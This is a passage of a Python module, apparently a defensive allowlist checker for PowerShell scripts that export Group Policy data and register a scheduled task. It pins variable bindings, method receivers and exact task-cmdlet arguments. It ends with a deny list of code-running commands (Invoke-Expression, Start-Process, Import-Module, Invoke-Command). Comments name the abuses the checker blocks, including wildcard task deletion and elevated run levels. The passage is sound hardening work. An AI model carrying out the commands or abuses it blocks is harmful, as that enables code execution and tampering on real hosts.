                '[script] = if ($dom) { $dom.DNSRoot } else { "" }',
            }
        ),
        # argument of write-host
        "domainsids": frozenset(
            {
                (
                    "[script] = @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
                    "$principals[$_].type -eq 'Unresolved' })"
                ),
            }
        ),
        # argument of get-content
        "f": frozenset(
            {
                "[script] foreach $xmlFiles",
            }
        ),
        # read by a binding of $sd
        "gpc": frozenset(
            {
                "[script] foreach $gpcObjs",
            }
        ),
        # condition $gpcObjs
        "gpcobjs": frozenset(
            {
                (
                    "[script] = Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                    '"(objectClass=groupPolicyContainer)" -Properties nTSecurityDescriptor, '
                    "displayName @adParams"
                ),
            }
        ),
        # argument of .add()
        "m": frozenset(
            {
                "[script] foreach $matches",
            }
        ),
        # argument of test-path
        "metafile": frozenset(
            {
                '[script] = Join-Path $SddlSource "gpo-metadata.json"',
            }
        ),
        # condition $obj
        "obj": frozenset(
            {
                (
                    "[script] = Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties "
                    "objectClass, sAMAccountName, name @adParams -ErrorAction Stop"
                ),
            }
        ),
        # condition $objClass
        "objclass": frozenset(
            {
                "[script] = $obj.objectClass[-1]",
            }
        ),
        # pipeline input $out
        "out": frozenset(
            {
                (
                    '[script] = [ordered]@{ collected = (Get-Date -Format "o"); domain = '
                    "$domainDns; principals = $principals }"
                ),
            }
        ),
        # write root
        "outputpath": frozenset(
            {
                '[script] param "principals.json"',
            }
        ),
        # argument of get-adobject
        "policiesdn": frozenset(
            {
                '[script] = "CN=Policies,CN=System,$($dom.DistinguishedName)"',
            }
        ),
        # index write $principals[$sid]
        "principals": frozenset(
            {
                "[script] = [ordered]@{}",
                "[script] index $principals[$sid]",
            }
        ),
        # argument of write-host
        "ptype": frozenset(
            {
                (
                    "[script] = switch ($objClass) { 'group' { 'Group' } 'computer' { "
                    "'Computer' } default { 'User' } }"
                ),
            }
        ),
        # argument of test-path
        "reportsdir": frozenset(
            {
                '[script] = Join-Path $SddlSource "reports"',
            }
        ),
        # argument of write-host
        "resolved": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "sam": frozenset(
            {
                '[script] = ""',
                "[script] = $matches[1]",
                "[script] = $matches[2]",
                "[script] = $translated",
                "[script] = if ($obj.sAMAccountName) { $obj.sAMAccountName } else { $obj.Name }",
            }
        ),
        # receiver of .getsecuritydescriptorsddlform()
        "sd": frozenset(
            {
                "[script] = $gpc.nTSecurityDescriptor",
            }
        ),
        # argument of .matches()
        "sddl": frozenset(
            {
                "[script] = $sd.GetSecurityDescriptorSddlForm()",
            }
        ),
        # argument of test-path
        "sddlsource": frozenset(
            {
                '[script] param ""',
            }
        ),
        # argument of new-object
        "sid": frozenset(
            {
                "[script] foreach $allSids | Sort-Object",
                "[script] foreach $domainSids",
            }
        ),
        # receiver of .translate()
        "sidobj": frozenset(
            {
                "[script] = New-Object System.Security.Principal.SecurityIdentifier($sid)",
            }
        ),
        # argument of write-host
        "translated": frozenset(
            {
                "[script] = $sidObj.Translate([System.Security.Principal.NTAccount]).Value",
            }
        ),
        # argument of write-host
        "unresolved": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # condition $xmlFiles
        "xmlfiles": frozenset(
            {
                "[script] += $allXml",
                (
                    '[script] += (Get-ChildItem $reportsDir -Filter "*.xml" -ErrorAction '
                    "SilentlyContinue).FullName"
                ),
                "[script] = @()",
            }
        ),
    },
    "Run-GpoLensCollection.ps1": {
        # write root
        "archive": frozenset(
            {
                "[get-gpolenscompletedexports] foreach $candidates",
                "[invoke-gpolenscollection] foreach $expired",
            }
        ),
        # argument of .getstring()
        "bytes": frozenset(
            {
                "[assert-gpolenscollectionowner] = Read-GpoLensOwnerMarkerBytes -Marker $marker",
                "[write-gpolenscollectionlog] = $encoding.GetByteCount($line)",
            }
        ),
        # condition $candidates
        "candidates": frozenset(
            {
                (
                    "[get-gpolenscompletedexports] = @(Get-ChildItem -LiteralPath $OutputRoot "
                    "-File -Filter '*.zip' -ErrorAction Stop | Where-Object { $_.BaseName "
                    "-match '^.+-\\d{8}-\\d{6}$' -and (Test-Path -LiteralPath (Join-Path "
                    "(Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml') -PathType Leaf) } | "
                    "Sort-Object @{ Expression = { $_.BaseName.Substring($_.BaseName.Length - "
                    "15) }; Descending = $true }, Name)"
                ),
            }
        ),
        # argument of .push()
        "child": frozenset(
            {
                (
                    "[assert-gpolensregulartree] foreach @(Get-ChildItem -LiteralPath "
                    "$directory -Force)"
                ),
            }
        ),
        # dynamic invocation & $CollectorPath -OutputRoot $OutputRoot *>&1
        "collectorpath": frozenset(
            {
                "[invoke-gpolenscollection] arg $CollectorPath",
                "[invoke-gpolenscollection] param",
                "[script] param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
            }
        ),
        # write root
        "copyto": frozenset(
            {
                "[invoke-gpolenscollection] arg $CopyTo",
                "[invoke-gpolenscollection] param",
                "[script] param",
            }
        ),
        # condition $created.Count -ne 1
        "created": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = @(Get-GpoLensCompletedExports -OutputRoot "
                    "$OutputRoot | Where-Object { -not $previous.ContainsKey($_.FullName) })"
                ),
            }
        ),
        # write root
        "delivery": frozenset(
            {
                "[invoke-gpolenscollection] = Join-Path $CopyTo $newest.Name",
            }
        ),
        # argument of get-item
        "directory": frozenset(
            {
                "[assert-gpolensregulartree] = $pending.Pop()",
            }
        ),
        # receiver of .getbytecount()
        "encoding": frozenset(
            {
                "[write-gpolenscollectionlog] = [Text.UTF8Encoding]::new($false)",
            }
        ),
        # receiver of .delete()
        "entry": frozenset(
            {
                "[invoke-gpolenscollection] = $zip.CreateEntry('gpo-inventory.json')",
                "[invoke-gpolenscollection] = $zip.GetEntry('gpo-inventory.json')",
                "[invoke-gpolenscollection] foreach @($inventory)",
            }
        ),
        # condition $expired
        "expired": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = @(Get-GpoLensCompletedExports -OutputRoot "
                    "$OutputRoot | Where-Object { [string]::Equals($_.BaseName.Substring(0, "
                    "$_.BaseName.Length - 16), $producerPrefix, [StringComparison]::Ordinal) } "
                    "| Select-Object -Skip $Retention)"
                ),
            }
        ),
        # write root
        "exportdir": frozenset(
            {
                "[invoke-gpolenscollection] = Join-Path $OutputRoot $newest.BaseName",
            }
        ),
        # argument of write-gpolenscollectionlog
        "failure": frozenset(
            {
                "[invoke-gpolenscollection] = $_",
            }
        ),
        # write root
        "folder": frozenset(
            {
                "[invoke-gpolenscollection] = Join-Path $OutputRoot $archive.BaseName",
            }
        ),
        # condition $i -ge 1
        "i": frozenset(
            {
                "[write-gpolenscollectionlog] = $LogFiles",
                "[write-gpolenscollectionlog] incdec PostfixMinusMinus",
            }
        ),
        # argument of .tryparse()
        "id": frozenset(
            {
                "[invoke-gpolenscollection] = [guid]::Empty",
                "[invoke-gpolenscollection] ref [guid]::TryParse([string]$entry.Id, [ref]$id)",
            }
        ),
        # receiver of .add()
        "ids": frozenset(
            {
                "[invoke-gpolenscollection] = [Collections.Generic.HashSet[guid]]::new()",
            }
        ),
        # condition -not $inventory
        "inventory": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = "
                    "[Text.Encoding]::UTF8.GetString($inventoryBytes).TrimStart([char]0xFEFF) "
                    "| ConvertFrom-Json"
                ),
            }
        ),
        # argument of .getstring()
        "inventorybytes": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = [IO.File]::ReadAllBytes((Resolve-Path "
                    "-LiteralPath $InventoryPath).ProviderPath)"
                ),
            }
        ),
        # argument of resolve-path
        "inventorypath": frozenset(
            {
                "[invoke-gpolenscollection] arg $InventoryPath",
                "[invoke-gpolenscollection] param",
                "[script] param",
            }
        ),
        # condition $item.Attributes -band [IO.FileAttributes]::ReparsePoint
        "item": frozenset(
            {
                "[assert-gpolensregulartree] = Get-Item -LiteralPath $directory -Force",
            }
        ),
        # receiver of .substring()
        "line": frozenset(
            {
                '[write-gpolenscollectionlog] = "$(Get-Date -Format o) $Message`r`n"',
                (
                    '[write-gpolenscollectionlog] = $line.Substring(0, $maxChars) + " '
                    '[truncated]`r`n"'
                ),
            }
        ),
        # receiver of .dispose()
        "lock": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = [IO.File]::Open((Join-Path $OutputRoot "
                    "'collection.lock'), [IO.FileMode]::OpenOrCreate, "
                    "[IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
                ),
            }
        ),
        # splatted
        "logargs": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = @{LogPath=(Join-Path $OutputRoot "
                    "'collection.log'); LogMaxBytes=$LogMaxBytes; LogFiles=$LogFiles}"
                ),
            }
        ),
        # argument of invoke-gpolenscollection
        "logfiles": frozenset(
            {
                "[invoke-gpolenscollection] arg $LogFiles",
                "[invoke-gpolenscollection] param 5",
                "[script] param 5",
                "[write-gpolenscollectionlog] param",
                "[write-gpolenscollectionlog] splat @logArgs",
            }
        ),
        # argument of invoke-gpolenscollection
        "logmaxbytes": frozenset(
            {
                "[invoke-gpolenscollection] arg $LogMaxBytes",
                "[invoke-gpolenscollection] param 5242880",
                "[script] param 5242880",
                "[write-gpolenscollectionlog] param",
                "[write-gpolenscollectionlog] splat @logArgs",
            }
        ),
        # write root
        "logpath": frozenset(
            {
                "[write-gpolenscollectionlog] param",
                "[write-gpolenscollectionlog] splat @logArgs",
            }
        ),
        # argument of test-path
        "marker": frozenset(
            {
                (
                    "[assert-gpolenscollectionowner] = Join-Path $OutputRoot "
                    "'.gpo-lens-collection-owner'"
                ),
                "[read-gpolensownermarkerbytes] arg $marker",
            }
        ),
        # argument of .substring()
        "maxchars": frozenset(
            {
                "[write-gpolenscollectionlog] = [math]::Max(1, [int]($LogMaxBytes / 4) - 40)",
            }
        ),
        # read by a binding of $line
        "message": frozenset(
            {
                (
                    '[write-gpolenscollectionlog] arg "Collection failed: '
                    '$($failure.Exception.Message)"'
                ),
                (
                    '[write-gpolenscollectionlog] arg "Collection succeeded: $($newest.Name); '
                    'retained at most $Retention exports"'
                ),
                '[write-gpolenscollectionlog] arg "ZIP delivered: $delivery"',
                "[write-gpolenscollectionlog] arg 'Collection started'",
                "[write-gpolenscollectionlog] arg ($_ | Out-String).TrimEnd()",
                "[write-gpolenscollectionlog] param",
            }
        ),
        # write root
        "newest": frozenset(
            {
                "[invoke-gpolenscollection] = $created[0]",
            }
        ),
        # write root
        "next": frozenset(
            {
                '[write-gpolenscollectionlog] = "$LogPath.$i"',
            }
        ),
        # write root
        "old": frozenset(
            {
                (
                    "[write-gpolenscollectionlog] = if ($i -eq 1) { $LogPath } else { "
                    '"$LogPath.$($i - 1)" }'
                ),
            }
        ),
        # write root
        "outputroot": frozenset(
            {
                "[assert-gpolenscollectionowner] arg $OutputRoot",
                "[assert-gpolenscollectionowner] param",
                "[get-gpolenscompletedexports] arg $OutputRoot",
                "[get-gpolenscompletedexports] param",
                "[invoke-gpolenscollection] arg $OutputRoot",
                "[invoke-gpolenscollection] param",
                "[script] param",
            }
        ),
        # argument of .equals()
        "owner": frozenset(
            {
                (
                    "[assert-gpolenscollectionowner] = "
                    "[Text.Encoding]::UTF8.GetString($bytes).TrimStart([char]0xFEFF).TrimEnd([c"
                    'har[]]"`r`n")'
                ),
            }
        ),
        # write root
        "partial": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = "
                    "\"$delivery.$([guid]::NewGuid().ToString('N')).partial\""
                ),
            }
        ),
        # receiver of .push()
        "pending": frozenset(
            {
                "[assert-gpolensregulartree] = [Collections.Generic.Stack[string]]::new()",
            }
        ),
        # receiver of .containskey()
        "previous": frozenset(
            {
                "[invoke-gpolenscollection] = @{}",
                "[invoke-gpolenscollection] index $previous[$_.FullName]",
            }
        ),
        # argument of where-object
        "producerprefix": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = $newest.BaseName.Substring(0, "
                    "$newest.BaseName.Length - 16)"
                ),
            }
        ),
        # argument of select-object
        "retention": frozenset(
            {
                "[invoke-gpolenscollection] arg $Retention",
                "[invoke-gpolenscollection] param 14",
                "[script] param 14",
            }
        ),
        # argument of .push()
        "root": frozenset(
            {
                "[assert-gpolensregulartree] arg $folder",
                "[assert-gpolensregulartree] param",
            }
        ),
        # receiver of .write()
        "stream": frozenset(
            {
                "[invoke-gpolenscollection] = $entry.Open()",
            }
        ),
        # argument of assert-gpolenscollectionowner
        "taskname": frozenset(
            {
                "[assert-gpolenscollectionowner] arg $TaskName",
                "[assert-gpolenscollectionowner] param",
                "[invoke-gpolenscollection] arg $TaskName",
                "[invoke-gpolenscollection] param 'GpoLensCollection'",
                "[script] param 'GpoLensCollection'",
            }
        ),
        # receiver of .getentry()
        "zip": frozenset(
            {
                "[get-gpolenscompletedexports] = $null",
                (
                    "[get-gpolenscompletedexports] = "
                    "[IO.Compression.ZipFile]::OpenRead($archive.FullName)"
                ),
                "[invoke-gpolenscollection] = $null",
                (
                    "[invoke-gpolenscollection] = "
                    "[IO.Compression.ZipFile]::Open($newest.FullName, 'Update')"
                ),
            }
        ),
    },
    "GpoLensCollectionMarker.ps1": {
        # receiver of .toarray()
        "bytes": frozenset(
            {
                "[read-gpolensownermarkerbytes] = [IO.MemoryStream]::new()",
                "[write-gpolensownermarkerbytes] param",
            }
        ),
        # argument of .tryparse()
        "count": frozenset(
            {
                "[read-gpolensownermarkerbytes] = & stat -L --format=%h -- $opened 2>$null",
            }
        ),
        # read by a binding of $opened
        "fd": frozenset(
            {
                (
                    "[read-gpolensownermarkerbytes] = "
                    "$stream.SafeFileHandle.DangerousGetHandle().ToInt64()"
                ),
            }
        ),
        # argument of .tryparse()
        "links": frozenset(
            {
                "[read-gpolensownermarkerbytes] = 0",
                (
                    "[read-gpolensownermarkerbytes] = "
                    "[GpoLens.MarkerFileInfo]::LinkCount($stream.SafeFileHandle)"
                ),
                (
                    "[read-gpolensownermarkerbytes] ref [uint32]::TryParse([string]$count, "
                    "[ref]$links)"
                ),
            }
        ),
        # write root
        "marker": frozenset(
            {
                "[read-gpolensownermarkerbytes] param",
                (
                    "[write-gpolensownermarkerbytes] = Join-Path $root.FullName "
                    "'.gpo-lens-collection-owner'"
                ),
            }
        ),
        # argument of test-path
        "opened": frozenset(
            {
                '[read-gpolensownermarkerbytes] = "/proc/$PID/fd/$fd"',
            }
        ),
        # argument of get-item
        "outputroot": frozenset(
            {
                "[write-gpolensownermarkerbytes] param",
            }
        ),
        # argument of join-path
        "root": frozenset(
            {
                (
                    "[write-gpolensownermarkerbytes] = Get-Item -LiteralPath $OutputRoot "
                    "-Force -ErrorAction Stop"
                ),
            }
        ),
        # receiver of .toint64()
        "stream": frozenset(
            {
                (
                    "[read-gpolensownermarkerbytes] = [IO.File]::Open($Marker, "
                    "[IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::Read)"
                ),
                (
                    "[write-gpolensownermarkerbytes] = [IO.File]::Open($marker, "
                    "[IO.FileMode]::CreateNew, [IO.FileAccess]::Write, [IO.FileShare]::None)"
                ),
            }
        ),
    },
    "Register-GpoLensCollection.ps1": {
        # argument of new-scheduledtaskprincipal
        "account": frozenset(
            {
                "[script] = if ($GmsaAccount) { $GmsaAccount } else { $ServiceAccount }",
            }
        ),
        # argument of new-scheduledtask
        "action": frozenset(
            {
                (
                    "[script] = New-ScheduledTaskAction -Execute "
                    '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" ` '
                    "-Argument $taskArgs -WorkingDirectory $PSScriptRoot"
                ),
            }
        ),
        # argument of write-host
        "at": frozenset(
            {
                "[script] param '02:00'",
            }
        ),
        # parameter of write-gpolensownermarkerbytes (pinned in GpoLensCollectionMarker.ps1)
        "bytes": frozenset(
            {
                "[write-gpolensownermarkerbytes] arg $previousBytes",
                (
                    "[write-gpolensownermarkerbytes] arg "
                    "([Text.UTF8Encoding]::new($false).GetBytes($TaskName))"
                ),
            }
        ),
        # argument of resolve-path
        "collectorpath": frozenset(
            {
                "[script] = (Resolve-Path -LiteralPath $CollectorPath).ProviderPath",
                "[script] param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
            }
        ),
        # argument of convertto-gpolenstaskargument
        "copyto": frozenset(
            {
                "[script] param",
            }
        ),
        # receiver of .getnetworkcredential()
        "credential": frozenset(
            {
                "[script] = $null",
                (
                    "[script] = Get-Credential -UserName $ServiceAccount -Message 'Collection "
                    "task credentials (saved only by Windows Task Scheduler)'"
                ),
                "[script] param",
            }
        ),
        # argument of new-scheduledtasktrigger
        "everydays": frozenset(
            {
                "[script] param 1",
            }
        ),
        # argument of new-scheduledtasksettingsset
        "executiontimelimit": frozenset(
            {
                "[script] param [timespan]::FromHours(2)",
            }
        ),
        # argument of set-gpolenscollectionowner
        "force": frozenset(
            {
                "[script] param",
                "[set-gpolenscollectionowner] arg $Force",
                "[set-gpolenscollectionowner] param",
            }
        ),
        # argument of set-gpolenscollectionowner
        "gmsaaccount": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of convertto-gpolenstaskargument
        "inventorypath": frozenset(
            {
                "[script] param",
            }
        ),
        # receiver of .dispose()
        "lock": frozenset(
            {
                (
                    "[set-gpolenscollectionowner] = [IO.File]::Open((Join-Path $OutputRoot "
                    "'collection.lock'), [IO.FileMode]::OpenOrCreate, "
                    "[IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
                ),
            }
        ),
        # read by a binding of $taskargs
        "logfiles": frozenset(
            {
                "[script] param 5",
            }
        ),
        # read by a binding of $taskargs
        "logmaxbytes": frozenset(
            {
                "[script] param 5242880",
            }
        ),
        # write root
        "marker": frozenset(
            {
                "[read-gpolensownermarkerbytes] arg $marker",
                (
                    "[set-gpolenscollectionowner] = Join-Path $OutputRoot "
                    "'.gpo-lens-collection-owner'"
                ),
            }
        ),
        # write root
        "outputroot": frozenset(
            {
                "[script] = [IO.Path]::GetFullPath($OutputRoot)",
                "[script] param",
                "[set-gpolenscollectionowner] arg $OutputRoot",
                "[set-gpolenscollectionowner] param",
                "[write-gpolensownermarkerbytes] arg $OutputRoot",
            }
        ),
        # argument of write-warning
        "owner": frozenset(
            {
                (
                    "[set-gpolenscollectionowner] = "
                    "[Text.Encoding]::UTF8.GetString($previousBytes).TrimStart([char]0xFEFF).Tr"
                    'imEnd([char[]]"`r`n")'
                ),
            }
        ),
        # argument of write-gpolensownermarkerbytes
        "previousbytes": frozenset(
            {
                "[set-gpolenscollectionowner] = $null",
                "[set-gpolenscollectionowner] = Read-GpoLensOwnerMarkerBytes -Marker $marker",
            }
        ),
        # argument of new-scheduledtask
        "principal": frozenset(
            {
                (
                    "[script] = New-ScheduledTaskPrincipal -UserId $account -LogonType "
                    "Password -RunLevel Limited"
                ),
            }
        ),
        # dynamic invocation & $RegisterTask
        "registertask": frozenset(
            {
                (
                    "[set-gpolenscollectionowner] arg { if ($GmsaAccount) { "
                    "Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force | "
                    "Out-Null } else { Register-ScheduledTask -TaskName $TaskName -InputObject "
                    "$task -User $ServiceAccount -Password $taskPassword -Force | Out-Null } }"
                ),
                "[set-gpolenscollectionowner] param",
            }
        ),
        # argument of write-host
        "retention": frozenset(
            {
                "[script] param 14",
            }
        ),
        # argument of convertto-gpolenstaskargument
        "runner": frozenset(
            {
                (
                    "[script] = (Resolve-Path -LiteralPath (Join-Path $PSScriptRoot "
                    "'Run-GpoLensCollection.ps1')).ProviderPath"
                ),
            }
        ),
        # argument of new-scheduledtasktrigger
        "scheduletime": frozenset(
            {
                "[script] = [datetime]::MinValue",
                (
                    "[script] ref [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)"
                ),
            }
        ),
        # argument of get-credential
        "serviceaccount": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of new-scheduledtask
        "settings": frozenset(
            {
                (
                    "[script] = New-ScheduledTaskSettingsSet -ExecutionTimeLimit "
                    "$ExecutionTimeLimit ` -MultipleInstances IgnoreNew -StartWhenAvailable"
                ),
            }
        ),
        # argument of set-gpolenscollectionowner
        "task": frozenset(
            {
                (
                    "[script] = New-ScheduledTask -Action $action -Trigger $trigger -Principal "
                    "$principal -Settings $settings ` -Description 'Read-only GPO export, "
                    "bounded retention, rotating logs and optional ZIP delivery.'"
                ),
            }
        ),
        # argument of new-scheduledtaskaction
        "taskargs": frozenset(
            {
                (
                    "[script] += ' -CopyTo ' + (ConvertTo-GpoLensTaskArgument "
                    "(ConvertTo-GpoLensAbsolutePath $CopyTo))"
                ),
                (
                    "[script] += ' -InventoryPath ' + (ConvertTo-GpoLensTaskArgument "
                    "(ConvertTo-GpoLensAbsolutePath $InventoryPath))"
                ),
                (
                    "[script] = '-NoProfile -NonInteractive -File ' + "
                    "(ConvertTo-GpoLensTaskArgument $runner) + ' -CollectorPath ' + "
                    "(ConvertTo-GpoLensTaskArgument $CollectorPath) + ' -OutputRoot ' + "
                    "(ConvertTo-GpoLensTaskArgument $OutputRoot) + ' -TaskName ' + "
                    '(ConvertTo-GpoLensTaskArgument $TaskName) + " -Retention $Retention '
                    '-LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"'
                ),
            }
        ),
        # argument of write-warning
        "taskname": frozenset(
            {
                "[script] param 'GpoLensCollection'",
                "[set-gpolenscollectionowner] arg $TaskName",
                "[set-gpolenscollectionowner] param",
            }
        ),
        # argument of set-gpolenscollectionowner
        "taskpassword": frozenset(
            {
                "[script] = $Credential.GetNetworkCredential().Password",
                "[script] = $null",
            }
        ),
        # argument of new-scheduledtask
        "trigger": frozenset(
            {
                (
                    "[script] = New-ScheduledTaskTrigger -Daily -DaysInterval $EveryDays -At "
                    "$scheduleTime"
                ),
            }
        ),
        # condition $Unregister
        "unregister": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of .getfullpath()
        "value": frozenset(
            {
                "[convertto-gpolensabsolutepath] arg $CopyTo",
                "[convertto-gpolensabsolutepath] arg $InventoryPath",
                "[convertto-gpolensabsolutepath] param",
                "[convertto-gpolenstaskargument] arg $CollectorPath",
                "[convertto-gpolenstaskargument] arg $OutputRoot",
                "[convertto-gpolenstaskargument] arg $TaskName",
                "[convertto-gpolenstaskargument] arg $runner",
                "[convertto-gpolenstaskargument] arg (ConvertTo-GpoLensAbsolutePath $CopyTo)",
                (
                    "[convertto-gpolenstaskargument] arg (ConvertTo-GpoLensAbsolutePath "
                    "$InventoryPath)"
                ),
                "[convertto-gpolenstaskargument] param",
            }
        ),
        # argument of new-scheduledtaskaction
        "windowsroot": frozenset(
            {
                "[script] = if ($env:SystemRoot) { $env:SystemRoot } else { 'C:\\Windows' }",
            }
        ),
    },
}

# Allowlisted instance method -> the receiver variables it may be called on
# (casefolded). A call on any other receiver fails (Sol instance_delete,
# DeepSeek NB-1 ADSI.CopyTo). Calls whose receiver is a type literal (static
# dispatch, receiver_var null) are screened only by the type denylist.
INSTANCE_RECEIVERS: dict[str, dict[str, frozenset[str]]] = {
    "Export-GpoEstate.ps1": {
        "Replace": frozenset({"f"}),
        "Substring": frozenset({"f"}),
        "Dispose": frozenset({"zip"}),
        "Add": frozenset(
            {"collectionerrors", "knownids", "successsections", "failedsections", "allsids"}
        ),
        "Trim": frozenset({"_", "gpc", "pf"}),
        "Contains": frozenset({"knownids"}),
        "Translate": frozenset({"sidobj"}),
        "Split": frozenset({"dom"}),
    },
    "Export-GroupMembers.ps1": {},
    "Export-Principals.ps1": {
        "Add": frozenset({"allsids"}),
        "GetSecurityDescriptorSddlForm": frozenset({"sd"}),
        "Translate": frozenset({"sidobj"}),
    },
    "Run-GpoLensCollection.ps1": {
        "Substring": frozenset({"line", "_", "newest"}),
        "GetByteCount": frozenset({"encoding"}),
        "GetEntry": frozenset({"zip"}),
        "Dispose": frozenset({"zip", "stream", "lock"}),
        "Push": frozenset({"pending"}),
        "Pop": frozenset({"pending"}),
        "Add": frozenset({"ids"}),
        "ContainsKey": frozenset({"previous"}),
        "Delete": frozenset({"entry"}),
        "CreateEntry": frozenset({"zip"}),
        "Open": frozenset({"entry"}),
        "Write": frozenset({"stream"}),
    },
    "GpoLensCollectionMarker.ps1": {
        "ToInt64": frozenset({"stream"}),
        "DangerousGetHandle": frozenset({"stream"}),
        "CopyTo": frozenset({"stream"}),
        "ToArray": frozenset({"bytes"}),
        "Dispose": frozenset({"bytes", "stream"}),
        "Write": frozenset({"stream"}),
    },
    "Register-GpoLensCollection.ps1": {
        "Dispose": frozenset({"lock"}),
        "ShouldProcess": frozenset({"pscmdlet"}),
        "GetNetworkCredential": frozenset({"credential"}),
    },
}

# Register-GpoLensCollection is the only script that writes a scheduled task.
# Each task cmdlet call must match one of these EXACT argument vectors (a frozen
# set of (parameter, normalized value) pairs, switch params valued None). An
# extra, missing or changed argument — a wildcard `-TaskName '*'`, a `-CimSession`
# remote target, `-RunLevel Highest`, a different `-Execute`/`-Argument` — matches
# no vector and fails (Sol task_abuse / taskname / unregister / cimsession /
# runlevel; DeepSeek NB-2). `Unregister-ScheduledTask` is included, so a
# wildcard deletion is rejected.
_PS = '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"'
TaskVector = frozenset[tuple[str, str | None]]
TASK_ARG_VECTORS: dict[str, frozenset[TaskVector]] = {
    "New-ScheduledTaskAction": frozenset(
        {
            frozenset(
                {("Execute", _PS), ("Argument", "$taskArgs"), ("WorkingDirectory", "$PSScriptRoot")}
            )
        }
    ),
    "New-ScheduledTaskPrincipal": frozenset(
        {frozenset({("UserId", "$account"), ("LogonType", "Password"), ("RunLevel", "Limited")})}
    ),
    "New-ScheduledTaskTrigger": frozenset(
        {frozenset({("Daily", None), ("DaysInterval", "$EveryDays"), ("At", "$scheduleTime")})}
    ),
    "New-ScheduledTaskSettingsSet": frozenset(
        {
            frozenset(
                {
                    ("ExecutionTimeLimit", "$ExecutionTimeLimit"),
                    ("MultipleInstances", "IgnoreNew"),
                    ("StartWhenAvailable", None),
                }
            )
        }
    ),
    "New-ScheduledTask": frozenset(
        {
            frozenset(
                {
                    ("Action", "$action"),
                    ("Trigger", "$trigger"),
                    ("Principal", "$principal"),
                    ("Settings", "$settings"),
                    (
                        "Description",
                        "'Read-only GPO export, bounded retention, rotating logs and "
                        "optional ZIP delivery.'",
                    ),
                }
            )
        }
    ),
    "Register-ScheduledTask": frozenset(
        {
            frozenset({("TaskName", "$TaskName"), ("InputObject", "$task"), ("Force", None)}),
            frozenset(
                {
                    ("TaskName", "$TaskName"),
                    ("InputObject", "$task"),
                    ("User", "$ServiceAccount"),
                    ("Password", "$taskPassword"),
                    ("Force", None),
                }
            ),
        }
    ),
    "Unregister-ScheduledTask": frozenset(
        {frozenset({("TaskName", "$TaskName"), ("Confirm", "$false")})}
    ),
}
_TASK_ACTION_SCRIPT = "Register-GpoLensCollection.ps1"
# Casefolded view (command and parameter names; values stay verbatim).
_TASK_VECTORS_CF: dict[str, frozenset[TaskVector]] = {
    cmd.casefold(): frozenset(frozenset((p.casefold(), v) for p, v in vec) for vec in vectors)
    for cmd, vectors in TASK_ARG_VECTORS.items()
}

# ---------------------------------------------------------------------------
# Round-4 closed sets (both reviewers' round-3 findings). Strict default: what
# cannot be positively pinned is refused.
# ---------------------------------------------------------------------------

# AST node types the collectors may contain: exactly the ones they use today.
# Classes/enums, DSC configurations, dynamic keywords, data sections, traps,
# `$using:`, pipeline chains (&&/||), ternaries and parse-error nodes are all
# refused rather than reasoned about.
ALLOWED_NODE_TYPES = frozenset(
    {
        "ArrayExpressionAst",
        "ArrayLiteralAst",
        "AssignmentStatementAst",
        "AttributeAst",
        "BinaryExpressionAst",
        "CatchClauseAst",
        "CommandAst",
        "CommandExpressionAst",
        "CommandParameterAst",
        "ConstantExpressionAst",
        "ContinueStatementAst",
        "ConvertExpressionAst",
        "ExitStatementAst",
        "ExpandableStringExpressionAst",
        "FileRedirectionAst",
        "ForEachStatementAst",
        "ForStatementAst",
        "FunctionDefinitionAst",
        "HashtableAst",
        "IfStatementAst",
        "IndexExpressionAst",
        "InvokeMemberExpressionAst",
        "MemberExpressionAst",
        "MergingRedirectionAst",
        "NamedAttributeArgumentAst",
        "NamedBlockAst",
        "ParamBlockAst",
        "ParameterAst",
        "ParenExpressionAst",
        "PipelineAst",
        "ReturnStatementAst",
        "ScriptBlockAst",
        "ScriptBlockExpressionAst",
        "StatementBlockAst",
        "StringConstantExpressionAst",
        "SubExpressionAst",
        "SwitchStatementAst",
        "ThrowStatementAst",
        "TryStatementAst",
        "TypeConstraintAst",
        "TypeExpressionAst",
        "UnaryExpressionAst",
        "VariableExpressionAst",
        "WhileStatementAst",
    }
)

# Commands that can never be allowlisted for a collector, whatever a policy
# says: they rebind command resolution (aliases, functions, drives, location),
# write variables by name, load or run code, or register engine callbacks.
FORBIDDEN_COMMANDS = frozenset(
    {
        "Add-PSSnapin",
        "Clear-Item",
        "Clear-Variable",
        "Export-Alias",
        "Import-Alias",
        "Import-Module",
        "Invoke-Command",
        "Invoke-Expression",
        "Invoke-Item",
        "New-Alias",
        "New-Module",
        "New-PSDrive",
        "New-Variable",
        "Pop-Location",
        "Push-Location",
        "Register-EngineEvent",
        "Register-ObjectEvent",
        "Remove-Variable",
        "Set-Alias",
        "Set-Item",
        "Set-ItemProperty",
        "Set-Location",
        "Set-PSBreakpoint",
        "Set-Variable",
        "Start-Job",
        "Start-Process",
        "Start-ThreadJob",
        "Update-FormatData",
        "Update-TypeData",
    }
)

